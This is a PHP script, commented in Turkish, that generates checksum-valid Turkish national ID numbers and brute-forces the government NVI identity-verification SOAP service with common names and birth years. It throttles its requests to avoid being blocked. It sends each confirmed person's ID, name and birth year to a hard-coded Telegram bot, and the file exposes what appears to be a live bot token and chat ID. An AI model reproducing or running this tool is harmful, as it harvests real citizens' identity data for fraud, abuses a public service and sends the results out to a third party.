<?php
header('Content-Type: text/html; charset=utf-8');
set_time_limit(0);

// --- TELEGRAM AYARLARI ---
$botToken = "8405664089:AAEJi8ipuYWCeKpRSFFYGINACt4Sej1xeNI"; 
$chatId = "8258235296";

function telegramGonder($mesaj, $token, $id) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($mesaj);
    @file_get_contents($url);
}

// --- TC ÜRETİCİ (ALGORİTMAYA UYGUN) ---
function tcUret() {
    $digits = [rand(1, 9)];
    for ($i = 1; $i < 9; $i++) $digits[$i] = rand(0, 9);
    $tek = $digits[0] + $digits[2] + $digits[4] + $digits[6] + $digits[8];
    $cift = $digits[1] + $digits[3] + $digits[5] + $digits[7];
    $h10 = (($tek * 7) - $cift) % 10;
    if ($h10 < 0) $h10 += 10;
    $h11 = (array_sum($digits) + $h10) % 10;
    return implode('', $digits) . $h10 . $h11;
}

// --- NVİ SORGULAYICI (CURL) ---
function nviSorgula($tc, $ad, $soyad, $yil) {
    $xml = '<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <TCKimlikNoDogrula xmlns="http://tckimlik.nvi.gov.tr/WS">
          <TCKimlikNo>'.$tc.'</TCKimlikNo>
          <Ad>'.$ad.'</Ad>
          <Soyad>'.$soyad.'</Soyad>
          <DogumYili>'.$yil.'</DogumYili>
        </TCKimlikNoDogrula>
      </soap:Body>
    </soap:Envelope>';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://tckimlik.nvi.gov.tr/Service/KPSPublic.asmx");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: text/xml; charset=utf-8',
        'SOAPAction: "http://tckimlik.nvi.gov.tr/WS/TCKimlikNoDogrula"',
    ]);

    $response = curl_exec($ch);
    curl_close($ch);
    return (strpos($response, '<TCKimlikNoDogrulaResult>true</TCKimlikNoDogrulaResult>') !== false);
}

// İSİM VE SOYİSİM HAVUZUNU GENİŞLET
$isimler = ["MEHMET", "MUSTAFA", "AHMET", "ALİ", "HÜSEYİN", "HASAN", "İBRAHİM", "MURAT", "AYŞE", "FATMA", "EMİNE", "HATİCE"];
$soyisimler = ["YILMAZ", "KAYA", "DEMİR", "ŞAHİN", "ÇELİK", "YILDIZ", "YILDIRIM", "ÖZTÜRK", "AYDIN", "ASLAN"];

echo "<h2>Çift Kanallı Tarama Başlatıldı...</h2>";

for($i=0; $i<100; $i++) {
    // 1. İŞLEM: Rastgele TC + Havuzdan İsim
    $tc1 = tcUret();
    $ad1 = $isimler[array_rand($isimler)];
    $soyad1 = $soyisimler[array_rand($soyisimler)];
    $yil1 = rand(1970, 2005);

    if (nviSorgula($tc1, $ad1, $soyad1, $yil1)) {
        $msg = "✅ KİŞİ BULUNDU (Kanal 1)!\nTC: $tc1\nAd Soyad: $ad1 $soyad1\nYıl: $yil1";
        telegramGonder($msg, $botToken, $chatId);
        echo "<b style='color:green;'>BULUNDU: $tc1</b><br>";
    }

    // 2. İŞLEM: Farklı Kombinasyon (Ad Soyad Odaklı)
    $tc2 = tcUret(); // Yeni bir TC
    $ad2 = $isimler[array_rand($isimler)];
    $soyad2 = $soyisimler[array_rand($soyisimler)];
    $yil2 = rand(1970, 2005);

    if (nviSorgula($tc2, $ad2, $soyad2, $yil2)) {
        $msg = "✅ KİŞİ BULUNDU (Kanal 2)!\nTC: $tc2\nAd Soyad: $ad2 $soyad2\nYıl: $yil2";
        telegramGonder($msg, $botToken, $chatId);
        echo "<b style='color:green;'>BULUNDU: $tc2</b><br>";
    }

    echo "."; // İşlem devam ediyor işareti
    if ($i % 10 == 0) echo "<br>Denemeler sürüyor...<br>";
    
    ob_flush();
    flush();
    usleep(200000); // 0.2 saniye bekle (Bloklanmamak için)
}
?>
